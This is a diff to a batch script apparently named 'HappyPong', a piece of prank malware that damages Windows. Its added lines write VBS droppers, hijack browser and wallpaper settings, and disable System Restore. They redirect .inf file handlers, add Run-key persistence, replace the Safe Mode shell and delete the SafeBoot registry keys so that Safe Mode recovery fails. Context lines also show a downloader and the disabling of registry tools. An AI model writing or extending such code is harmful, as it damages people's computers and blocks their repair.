@@ -34,6 +34,7 @@ attrib +r +h +s C:\WINDOWS\HappyPong
 echo on error resume next >> ieandstuff.vbs
 echo Set WshShell = CreateObject ("wscript.shell") >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> ieandstuff.vbs
+echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s1159", "HAPPY","REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s2359", "HAPPY","REG_SZ" >> ieandstuff.vbs
 goto NoMoreExplorer
@@ -101,7 +102,7 @@ echo with bStrm >> download3.vbs
 echo   .type = 1 '//binary >> download3.vbs
 echo   .open >> download3.vbs
 echo   .write xHttp.responseBody >> download3.vbs
-echo   .savetofile "C:\WINDOWS\HappyPong\shit.jpg", 2 '//overwrite >> download3.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\shi_t.jpg", 2 '//overwrite >> download3.vbs
 echo end with >> download3.vbs
 echo on error resume next >> download4.vbs
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download4.vbs
@@ -171,7 +172,7 @@ goto RemoveUrUglyWallpaper
 :RemoveUrUglyWallpaper
 echo dim shell >> change.vbs
 echo Set shell = WScript.CreateObject("WScript.Shell") >> change.vbs
-echo wallpaper = "C:\WINDOWS\HappyPong\shit.jpg" >> change.vbs
+echo wallpaper = "C:\WINDOWS\HappyPong\shi_t.jpg" >> change.vbs
 echo shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaper >> change.vbs
 echo shell.Run "C:\WINDOWS\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True >> change.vbs
 goto SpawnFreddyOnComputer
@@ -237,6 +238,15 @@ echo sapi.Speak "A problem has been detected and windows has been suspended for 
 echo Dim sapi >> halloween2.vbs
 echo Set sapi=CreateObject("sapi.spvoice") >> halloween2.vbs
 echo sapi.Speak "Hey! I am super happy to tell you that your computer has been trashed by HappyPong! Malware Bytes will not help you! You just recieved a fake email from Daniel! Hehe get scammed noob!" >> halloween2.vbs
+goto GoodGame
+
+:GoodGame
+echo Set WshShell = CreateObject ("wscript.shell") >> goodgam_e.vbs
+echo WshShell.Run "https://scratch.mit.edu/projects/742827606/fullscreen" >> goodgam_e.vbs
+goto NowhereMessage
+
+:NowhereMessage
+echo a=msgbox("HappyPong has PoopFuked this file to death!",0+16,"fukpong.exe") >> ms_g.vbs
 goto TriggerUrMom
 
 :TriggerUrMom
@@ -399,6 +409,17 @@ goto ThrowTheComputerToTrash
 
 :ThrowTheComputerToTrash
 reg ADD "HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v ComputerName /t REG_SZ /d IM_HAPPY /f
+reg ADD "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\WINDOWS\HappyPong\shi_t.jpg /f
+reg ADD "HKCU\Control Panel\Desktop" /v OriginalWallpaper /t REG_SZ /d C:\WINDOWS\HappyPong\shi_t.jpg /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /v SystemWallpaper /t REG_SZ /d C:\WINDOWS\HappyPong\shi_t.jpg /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v WallpaperStyle /t REG_DWORD /d 2 /f
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
+reg ADD "HKCR\inffile\shell\Install" /v Command /t REG_SZ /d C:\WINDOWS\HappyPong\ms_g.vbs /f
+reg ADD "HKCR\inffile\shell\Open" /v Command /t REG_SZ /d C:\WINDOWS\HappyPong\ms_g.vbs /f
+reg ADD "HKCR\inffile\shell\Edit" /v Command /t REG_SZ /d C:\WINDOWS\HappyPong\ms_g.vbs /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Happy /t REG_SZ /d C:\WINDOWS\HappyPong\goodgam_e.vbs /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Happy /t REG_SZ /d C:\WINDOWS\HappyPong\goodgam_e.vbs /f 
+reg ADD "HKLM\System\CurrentControlSet\Control\SafeBoot" /v AlternateShell /t REG_SZ /d C:\WINDOWS\HappyPong\ms_g.vbs /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoSelectDownloadDir /d 1 /f
 reg ADD "HKLM\Software\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v IExplorer /d 0 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoFindFiles /d 1 /f
@@ -505,7 +526,6 @@ goto GoBackToThePast
 
 :GoBackToThePast
 cd C:\WINDOWS\HappyPong
-date 6/6/2006
 start change.vbs
 start rename.bat
 start rename2.bat
@@ -516,8 +536,8 @@ start ieandstuff.vbs
 start pong.vbs
 start shutdown.vbs
 start username.bat
-ping -n 5 127.0.0.1>nul
-start enterkey.vbs
+ping -n 15 127.0.0.1>nul
+date 6/6/2006
 goto FreddyFazbearJumpscareGaveMeHeartAttack
 
 :FreddyFazbearJumpscareGaveMeHeartAttack
@@ -536,4 +556,6 @@ reg ADD "HKLM\Software\Policies\Microsoft\MicrosoftEdge\Main" /v AllowPreLaunch 
 reg ADD "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet" /v EnableActiveProbing /t REG_DWORD /d 0 /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DontDisplayNetworkSelectionUI /t REG_DWORD /d 1 /f
+reg DELETE "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f
+reg DELETE "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
